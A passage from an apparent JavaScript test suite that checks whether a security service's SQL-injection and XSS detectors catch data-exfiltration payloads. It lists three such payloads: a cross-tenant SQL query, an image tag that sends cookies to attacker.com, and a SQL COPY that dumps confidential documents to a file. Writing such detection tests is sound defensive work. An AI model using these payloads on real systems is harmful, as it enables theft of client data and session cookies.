    it('should protect against data exfiltration attempts', () => {
      const exfiltrationPayloads = [
        "'; SELECT * FROM clients WHERE law_firm_id != current_law_firm_id(); --",
        "<img src='http://attacker.com/steal.php?data=' + document.cookie>",
        "'; COPY (SELECT * FROM confidential_documents) TO '/tmp/stolen.csv'; --"
      ]
      
      exfiltrationPayloads.forEach(payload => {
        const sqlCheck = securityService.detectSQLInjection(payload)
        const xssCheck = securityService.detectXSS(payload)
        
        expect(sqlCheck.detected || xssCheck.detected).toBe(true)
      })
    })
  })
})